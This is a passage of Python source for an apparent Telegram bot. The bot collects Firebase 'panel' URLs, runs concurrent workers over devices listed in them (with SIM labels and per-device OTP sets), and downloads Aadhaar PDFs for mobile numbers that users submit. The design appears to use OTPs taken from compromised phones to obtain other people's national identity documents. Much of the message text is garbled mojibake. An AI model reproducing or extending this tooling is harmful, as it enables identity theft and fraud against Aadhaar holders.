                    if is_rich_mode:
                        blocks = build_batch_rich_blocks(panel_name, dev_statuses, done_c, total_c, success_c, fail_c)
                        edit_payload = {
                            "chat_id": chat_id,
                            "message_id": dash_msg_id,
                            "rich_message": {"blocks": blocks}
                        }
                        if kb is not None:
                            edit_payload["reply_markup"] = kb.to_dict()

                        try:
                            await ctx.bot.do_api_request("editMessageText", api_kwargs=edit_payload)
                            last_render_key = render_key
                        except Exception as e_rich:
                            err_s = str(e_rich).lower()
                            if "not modified" in err_s:
                                last_render_key = render_key
                            else:
                                logger.debug(f"Rich message edit failed: {e_rich}")
                    else:
                        try:
                            html_text = build_batch_html_text(panel_name, dev_statuses, done_c, total_c, success_c, fail_c)
                            await ctx.bot.edit_message_text(
                                chat_id=chat_id,
                                message_id=dash_msg_id,
                                text=html_text,
                                reply_markup=kb,
                                parse_mode='HTML'
                            )
                            last_render_key = render_key
                        except Exception as e_html:
                            err_s = str(e_html).lower()
                            if "not modified" in err_s:
                                last_render_key = render_key
                            else:
                                logger.debug(f"HTML dashboard edit failed: {e_html}")
                await asyncio.sleep(1.5)

        updater_task = asyncio.create_task(dashboard_updater())
        sem = asyncio.Semaphore(10)
        device_locks = defaultdict(asyncio.Lock)
        device_used_otps = defaultdict(set)

        async def worker(dev_item):
            did = dev_item['device_id']
            sim_lbl = dev_item.get('_sim_label', '')
            status_key = f"{did}_{sim_lbl}" if sim_lbl else did
            fb_u = dev_item.get('fb_url') or FIREBASE_URL
            fb_k = dev_item.get('fb_key') or ''

            async with sem:
                if self.active_batches.get(uid, {}).get('cancel'):
                    dev_statuses[status_key]['status'] = "Ã°ÂÂÂ Cancelled"
                    dev_statuses[status_key]['done'] = True
                    dashboard_dirty.set()
                    return

                if sim_lbl and sim_lbl != "SIM1":
                    dev_statuses[status_key]['status'] = "Ã¢ÂÂ³ Waiting for SIM 1..."
                    dashboard_dirty.set()

                async with device_locks[did]:
                    if self.active_batches.get(uid, {}).get('cancel'):
                        dev_statuses[status_key]['status'] = "Ã°ÂÂÂ Cancelled"
                        dev_statuses[status_key]['done'] = True
                        dashboard_dirty.set()
                        return

                    async def _on_status(msg_text):
                        dev_statuses[status_key]['status'] = msg_text
                        dashboard_dirty.set()

                    dev_statuses[status_key]['status'] = "Ã¢ÂÂ³ Starting..."
                    dashboard_dirty.set()

                    try:
                        ok, reason, meta = await self.download_device_auto(
                            ctx=ctx, chat_id=chat_id, user=user, dev=dev_item,
                            fb_url=fb_u, fb_key=fb_k,
                            status_updater=_on_status,
                            check_cancelled=lambda: self.active_batches.get(uid, {}).get('cancel', False),
                            device_otps=device_used_otps[did]
                        )
                        dev_statuses[status_key]['done'] = True
                        if meta and meta.get('mobile'):
                            dev_statuses[status_key]['mobile'] = meta['mobile']
                        if ok:
                            dev_statuses[status_key]['success'] = True
                            pname = meta.get('name') if meta else 'Success'
                            dev_statuses[status_key]['status'] = f"Ã¢ÂÂ Done ({pname})"
                            dev_statuses[status_key]['meta'] = meta
                        else:
                            dev_statuses[status_key]['status'] = f"Ã¢ÂÂ {reason}"
                    except Exception as ex:
                        logger.error(f"Worker exception {status_key}: {ex}", exc_info=True)
                        dev_statuses[status_key]['done'] = True
                        dev_statuses[status_key]['status'] = "Ã¢ÂÂ Error"
                    dashboard_dirty.set()

        try:
            await asyncio.gather(*(worker(d) for d in valid_devices), return_exceptions=True)
        finally:
            self.active_batches.pop(uid, None)
            dashboard_running = False
            dashboard_dirty.set()
            try:
                await updater_task
            except Exception:
                pass

        final_success = sum(1 for s in dev_statuses.values() if s['success'])
        final_fail = len(dev_statuses) - final_success

        if is_rich_mode:
            final_blocks = build_batch_rich_blocks(panel_name, dev_statuses, len(dev_statuses), len(dev_statuses), final_success, final_fail)
            final_edit_payload = {
                "chat_id": chat_id,
                "message_id": dash_msg_id,
                "rich_message": {"blocks": final_blocks}
            }
            try:
                await ctx.bot.do_api_request("editMessageText", api_kwargs=final_edit_payload)
            except Exception as e_final_rich:
                err_s = str(e_final_rich).lower()
                if "not modified" not in err_s:
                    logger.debug(f"Final rich edit error: {e_final_rich}")
        else:
            try:
                final_html = build_batch_html_text(panel_name, dev_statuses, len(dev_statuses), len(dev_statuses), final_success, final_fail)
                await ctx.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=dash_msg_id,
                    text=final_html,
                    parse_mode='HTML'
                )
            except Exception:
                pass

        await ctx.bot.send_message(
            chat_id=chat_id,
            text=(
                f"<b>{emo('Ã°ÂÂÂ')} ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
                "<blockquote>"
                f"<b>{emo('Ã°ÂÂÂ¥')} Panel:</b> <code>{html.escape(panel_name)}</code>\n"
                f"<b>{emo('Ã°ÂÂÂ±')} Total Devices:</b> <code>{len(dev_statuses)}</code>\n"
                f"<b>{emo('Ã¢ÂÂ')} Successfully Downloaded:</b> <code>{final_success}</code>\n"
                f"<b>{emo('Ã¢ÂÂ')} Failed / Skipped:</b> <code>{final_fail}</code>"
                "</blockquote>\n\n"
                "<b>Sabhi Aadhaar PDFs upar bhej diye gaye hain! Ã°ÂÂÂ</b>"
            ),
            reply_markup=self.get_main_menu_keyboard(),
            parse_mode='HTML'
        )

    # ==========================================
    # ROUTER
    # ==========================================
    async def handle_message(self, update, ctx):
        if not update.effective_user or not update.message:
            return

        uid = update.effective_user.id
        data = self.get_user_data(uid)

        text_raw = update.message.text.strip() if update.message.text else ""

        # 1. Universal cancel check
        if text_raw.lower() in ("/cancel", "cancel"):
            if data.get('awaiting_firebase_add'):
                self.update_user_data(uid, 'awaiting_firebase_add', None)
                self.update_user_data(uid, 'fb_adding_name', None)
                await update.message.reply_text("Ã¢ÂÂ Firebase add cancel ho gaya. /start")
                return
            if data.get('download_mode') or (data.get('stage') and data.get('stage') != 'main_menu'):
                self.clear_user_data(uid)
                await update.message.reply_text("Ã¢ÂÂ Session cancel ho gaya. /start")
                return

        # 2. If user is in Aadhaar download mode, clear any dangling firebase add state
        if data.get('download_mode'):
            self.update_user_data(uid, 'awaiting_firebase_add', None)
            self.update_user_data(uid, 'fb_adding_name', None)
            data['awaiting_firebase_add'] = None

        if data.get('awaiting_firebase_add'):
            step = data.get('awaiting_firebase_add')
            cancel_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data="cancel_firebase_add", style="danger")]
            ])

            # Step 1 Ã¢ÂÂ naam liya, ab URL maango (ya agar direct URL/link bheja ho to auto-detect)
            if step == 'name':
                extracted_direct = extract_all_firebases(text_raw)
                if extracted_direct:
                    step = 'url'
                    url_raw = text_raw
                    name = ""
                else:
                    self.update_user_data(uid, 'fb_adding_name', text_raw)
                    self.update_user_data(uid, 'awaiting_firebase_add', 'url')
                    await update.message.reply_text(
                        f"<b>{emo('Ã¢ÂÂ')} ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â: <code>{html.escape(text_raw)}</code></b>\n\n"
                        f"<b>{emo('Ã°ÂÂÂ')} sÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â 2:</b> ÃÂ´Ã¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ:\n"
                        "<code>https://xxx-default-rtdb.firebaseio.com</code>\n"
                        "<i>(ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ Ã¡Â´ÂÃÂsÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ?m= Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ ÃÂÃÂªÃÂ´Ã¡Â´Â)</i>\n\n"
                        "<b>Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ:</b> Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ´ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡ Ã¡Â´ÂÃÂ sÃ¡Â´ÂÃÂ´Ã¡Â´Â /cancel",
                        reply_markup=cancel_kb,
                        parse_mode='HTML'
                    )
                    return

            # Step 2 Ã¢ÂÂ URL aaya, validate and save karo
            if step == 'url':
                url_raw = text_raw.strip()
                name = data.get('fb_adding_name') or ''

                # Check if user entered a 10-digit mobile number by mistake
                if re.match(r'^[6-9]\d{9}$', url_raw):
                    await update.message.reply_text(
                        f"<b>{emo('Ã¢ÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
                        "<blockquote>"
                        "<b>Aapne 10-digit mobile number bheja hai, lekin bot abhi Firebase URL ka wait kar raha tha.</b>\n\n"
                        "Ã¢ÂÂ¢ <b>Aadhaar Download</b> karna hai? Neeche <b>Cancel</b> dabayein aur fir <b>Download Aadhaar</b> click karein.\n"
                        "Ã¢ÂÂ¢ <b>Firebase Add</b> karna hai? Sahi Realtime Database URL daalein."
                        "</blockquote>",
                        reply_markup=cancel_kb,
                        parse_mode='HTML'
                    )
                    return

                extracted_list = extract_all_firebases(url_raw)
                if not extracted_list:
                    await update.message.reply_text(
                        f"<b>{emo('Ã¢ÂÂ')} ÃÂªÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ!</b>\n\n"
                        "<blockquote>"
                        "<b>Ã¡Â´ÂÃÂÃÂªs ÃÂªs ÃÂ´Ã¡Â´ÂÃ¡Â´Â Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ ÃÂÃÂªÃÂ´Ã¡Â´Â.</b>\n"
                        "Ã¡Â´ÂÃÂ´ÃÂÃÂ Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂs Ã¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.\n\n"
                        f"<b>{emo('Ã°ÂÂÂ')} Ã¡Â´ÂxÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Âs:</b>\n"
                        "Ã¢ÂÂ¢ <code>https://your-panel-default-rtdb.firebaseio.com</code>\n"
                        "Ã¢ÂÂ¢ <code>https://your-site.vercel.app/?m=base64...</code>\n\n"
                        "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ Ã¡Â´ÂÃÂ Ã¡Â´ÂÃÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´Â¡.</b>"
                        "</blockquote>",
                        reply_markup=cancel_kb,
                        parse_mode='HTML'
                    )
                    return

                # Multiple Firebase panels detected (e.g. from ?m= link or multi URLs)
                if len(extracted_list) > 1:
                    checking_msg = await update.message.reply_text(
                        f"<b>{emo('Ã¢ÂÂ³')} {len(extracted_list)} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃªÂÂ± Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ ÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂªÃÂ´...</b>\n\n"
                        f"<i>Sabhi panels ki active status check aur database me add kiya ja raha hai...</i>",
                        parse_mode='HTML'
                    )

                    def _bulk_verify_and_save(uid_val, custom_pfx, items):
                        results = []
                        def _process_one(it):
                            u = it['url']
                            k = it.get('key', '')
                            p_name = it.get('name') or extract_firebase_name_from_url(u)
                            if custom_pfx and custom_pfx not in ('My Firebase', 'Panel', 'MyPanel'):
                                p_name = f"{custom_pfx} - {p_name}"
                            is_act, reason = check_firebase_active(u, k)
                            if is_act:
                                fb_id, is_new = add_or_update_firebase(uid_val, p_name, u, k)
                                return {'url': u, 'key': k, 'name': p_name, 'id': fb_id, 'active': True, 'is_new': is_new}
                            else:
                                return {'url': u, 'key': k, 'name': p_name, 'active': False, 'reason': reason}

                        with ThreadPoolExecutor(max_workers=15) as pool:
                            results = list(pool.map(_process_one, items))
                        return results

                    processed = await asyncio.to_thread(_bulk_verify_and_save, uid, name, extracted_list)
                    try:
                        await checking_msg.delete()
                    except Exception:
                        pass

                    active_panels = [p for p in processed if p.get('active')]
                    inactive_panels = [p for p in processed if not p.get('active')]
                    new_panels = [p for p in active_panels if p.get('is_new')]

                    if not active_panels:
                        first_err = inactive_panels[0].get('reason', 'Database deactivated') if inactive_panels else 'No active database'
                        await update.message.reply_text(
                            f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ±Ã¡Â´ÂÃÂÃÂÃÂª ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂªÃÂ´!</b>\n\n"
                            f"<blockquote>"
                            f"<b>Is link me se koi bhi panel active nahi mila ({len(inactive_panels)} inactive).</b>\n\n"
                            f"<b>Ã°ÂÂÂ Reason:</b> <i>{html.escape(first_err)}</i>\n\n"
                            f"<b>Kripya active panels daalein ya /cancel karein.</b>"
                            f"</blockquote>",
                            reply_markup=cancel_kb,
                            parse_mode='HTML'
                        )
                        return

                    self.update_user_data(uid, 'awaiting_firebase_add', None)
                    self.update_user_data(uid, 'fb_adding_name', None)

                    if new_panels:
                        asyncio.create_task(self._notify_admins_new_firebases_bulk(ctx, update.effective_user, new_panels))

                    lines = []
                    for i, p in enumerate(processed[:20], 1):
                        st_icon = emo('Ã¢ÂÂ') if p.get('active') else emo('Ã¢ÂÂ')
                        tag = "Active Ã°ÂÂÂ¢" if p.get('active') else "Inactive Ã°ÂÂÂ´"
                        lines.append(f"<code>[{i:02d}]</code> {st_icon} <b>{html.escape(p['name'])}</b>: <code>{tag}</code>")
                    if len(processed) > 20:
                        lines.append(f"<i>...aur {len(processed) - 20} aur panels</i>")

                    kb = self.get_firebase_selection_keyboard(uid)
                    await update.message.reply_text(
                        f"<b>{emo('Ã°ÂÂÂ¥')} {len(active_panels)}/{len(processed)} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃªÂÂ± Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
                        f"<blockquote>" + "\n".join(lines) + "</blockquote>\n\n"
                        f"<b>Sabhi {len(active_panels)} panels ke alag-alag buttons neeche menu me add ho gaye hain! Kisi bhi panel par click karke direct download kar sakte hain. Ã¢ÂÂ¡</b>",
                        reply_markup=kb,
                        parse_mode='HTML'
                    )
                    return

                # Single Firebase panel flow
                item = extracted_list[0]
                url = item['url']
                key = item.get('key', '')
                p_name = name if (name and name != 'My Firebase') else item.get('name') or extract_firebase_name_from_url(url)

                checking_msg = await update.message.reply_text(
                    f"<b>{emo('Ã¢ÂÂ³')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂ ÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂª...</b>\n\n"
                    f"<code>{html.escape(url)}</code>",
                    parse_mode='HTML'
                )
                is_active, reason = await asyncio.to_thread(check_firebase_active, url, key)
                if not is_active:
                    try:
                        await checking_msg.delete()
                    except Exception:
                        pass
                    await update.message.reply_text(
                        f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃÂª!</b>\n\n"
                        "<blockquote>"
                        f"<b>Ye Firebase panel deactivate ya delete ho chuka hai aur add nahi kiya ja sakta.</b>\n\n"
                        f"<b>Ã°ÂÂÂ Reason:</b> <i>{html.escape(reason)}</i>\n\n"
                        "<b>Kripya active Firebase URL daalein ya neeche button se cancel karein.</b>"
                        "</blockquote>",
                        reply_markup=cancel_kb,
                        parse_mode='HTML'
                    )
                    return

                try:
                    await checking_msg.delete()
                except Exception:
                    pass

                self.update_user_data(uid, 'awaiting_firebase_add', None)
                self.update_user_data(uid, 'fb_adding_name', None)

                fb_id, is_new = await asyncio.to_thread(add_or_update_firebase, uid, p_name, url, key)
                if is_new:
                    asyncio.create_task(self._notify_admins_new_firebase(ctx, update.effective_user, p_name, url))
                else:
                    logger.info(f"Firebase URL {url} already existed in system. Skipping admin notification.")

                kb = self.get_firebase_selection_keyboard(uid)
                await update.message.reply_text(
                    f"<b>{emo('Ã¢ÂÂ')} ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃªÂÂ±Ã¡Â´Â ÃªÂÂ±Ã¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â & Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃªÂÂ°ÃÂªÃ¡Â´ÂÃ¡Â´Â!</b>\n\n"
                    "<blockquote>"
                    f"<b>Ã°ÂÂÂ Naam:</b> <code>{html.escape(p_name)}</code>\n"
                    f"<b>Ã°ÂÂÂ URL:</b> <code>{html.escape(url)}</code>\n"
                    f"<b>Ã¢ÂÂ¡ Status:</b> <code>Active Ã°ÂÂÂ¢</code>"
                    "</blockquote>\n\n"
                    "<b>Ab Download via Firebase se is panel se download kar sakte ho.</b>",
                    reply_markup=kb,
                    parse_mode='HTML'
                )
                return

        if is_admin(uid) and data.get('awaiting_broadcast'):
            self.update_user_data(uid, 'broadcast_msg_id', update.message.message_id)
            self.update_user_data(uid, 'broadcast_chat_id', update.message.chat_id)
            self.update_user_data(uid, 'awaiting_broadcast', False)
            pin_mode = data.get('broadcast_pin', False)
            mode_title = f"{emo('Ã°ÂÂÂ')} Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´" if pin_mode else f"{emo('Ã¢ÂÂ Ã¯Â¸Â')} ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂ´ÃªÂÂ°ÃÂªÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´"
            pin_note = "\n<b>Ã°ÂÂÂ NOTE: This broadcast will be automatically PINNED in all users' chats!</b>\n" if pin_mode else ""
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Ã¢ÂÂ YES, SEND BROADCAST", callback_data='broadcast_confirm_msg'),
                 InlineKeyboardButton("Ã¢ÂÂ CANCEL", callback_data='broadcast_cancel')]
            ])
            total = get_all_users_count()
            await update.message.reply_text(
                f"<b>{mode_title}</b>\n\n"
                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´Âs: {total}</b>{pin_note}\n"
                "<b>Ã°ÂÂÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ¢ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªs Ã¡Â´ÂÃÂ´Ã¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´ÃÂ¢ Ã¡Â´ÂÃÂÃ¡Â´Â 100% Ã¡Â´ÂÃÂÃ¡Â´ÂsÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´Â.</b>\n"
                "<b>Ã¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´Â¡Ã¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂ´Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªs ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â?</b>",
                reply_markup=kb, parse_mode='HTML')
            return

        text = update.message.text.strip() if update.message.text else ""

        if is_user_banned(uid):
            return

        if not data.get('verified'):
            await self.show_force_join(update, ctx)
            return

        if not data.get('download_mode'):
            return

        if is_maintenance_mode() and not is_admin(uid):
            await update.message.reply_text(
                f"<b>{emo('Ã°ÂÂÂ Ã¯Â¸Â')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â</b>\n\n"
                "<blockquote>"
                "<b>Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â¡ÃÂ´ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â sÃ¡Â´ÂÃÂÃ¡Â´Â ÃÂªÃ¡Â´ÂÃ¡Â´Â ÃÂªs Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃÂªÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â.</b>\n"
                "<b>Ã¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂsÃ¡Â´Â Ã¡Â´ÂÃÂÃÂ Ã¡Â´ÂÃÂ¢Ã¡Â´ÂÃÂªÃÂ´ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂ. Ã¡Â´ÂÃÂÃ¡Â´ÂÃÂ´Ã¡Â´Â ÃÂÃ¡Â´ÂÃ¡Â´Â ÃªÂÂ°Ã¡Â´ÂÃÂ ÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´Â! Ã°ÂÂÂ</b>"
                "</blockquote>",
                parse_mode='HTML'
            )
            return

        created = data.get('created_at', 0)
        if created and time.time() - created > SESSION_TIMEOUT:
            self.clear_user_data(uid)
            await update.message.reply_text(
                f"<b>{emo('Ã¢ÂÂ³')} sÃ¡Â´ÂssÃÂªÃ¡Â´ÂÃÂ´ Ã¡Â´ÂxÃ¡Â´ÂÃÂªÃÂÃ¡Â´ÂÃ¡Â´Â</b>\n"
                "<b>/start</b>", parse_mode='HTML')
            return

        stage = data.get('stage', 'mobile')

        if stage == 'mobile':
            parts = [p.strip() for p in text.split("|")]
            mobile = parts[0].replace(" ", "").replace("-", "")

            if not mobile.isdigit() or len(mobile) != 10:
                await update.message.reply_text(
                    f"<b>{emo('Ã¢ÂÂ')} Ã¡Â´Â Ã¡Â´ÂÃÂÃÂªÃ¡Â´Â 10-Ã¡Â´ÂÃÂªÃÂ¢ÃÂªÃ¡Â´Â Ã¡Â´ÂÃ¡Â´ÂÃÂÃÂªÃÂÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃÂ ÃÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃ¡Â´Â.</b>\n"
                    "<i>(Format: <code>9876543210</code> ya <code>9876543210|Name</code>)</i>",
                    parse_mode='HTML')
                return

            if len(parts) > 1 and parts[1]:
                name = parts[1]
                dob  = parts[2] if len(parts) > 2 and parts[2] else None
                await self._uidai_start_flow(update, ctx, mobile, name, dob)
                return

            self.update_user_data(uid, 'mobile', mobile)
            self.update_user_data(uid, 'stage', 'awaiting_name')
            self.update_user_data(uid, 'created_at', time.time())

            skip_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("ÃªÂÂ±Ã¡Â´ÂÃÂªÃ¡Â´Â ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂÃªÂÂ°Ã¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´Â Ã¡Â´ÂÃÂ)", callback_data='skip_name', style="primary")],
                [InlineKeyboardButton("Ã¡Â´ÂÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃÂ", callback_data='cancel_flow', style="danger")]
            ])

            await update.message.reply_text(
                f"<b>{emo('Ã°ÂÂÂ¤')} Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂÃ¡Â´ÂÃ¡Â´ÂÃÂ ÃÂ´Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´Â (Ã¡Â´ÂÃ¡Â´ÂÃ¡Â´ÂÃÂªÃ¡Â´ÂÃÂ´Ã¡Â´ÂÃÂ)</b>\n\n"
                "<blockquote>"
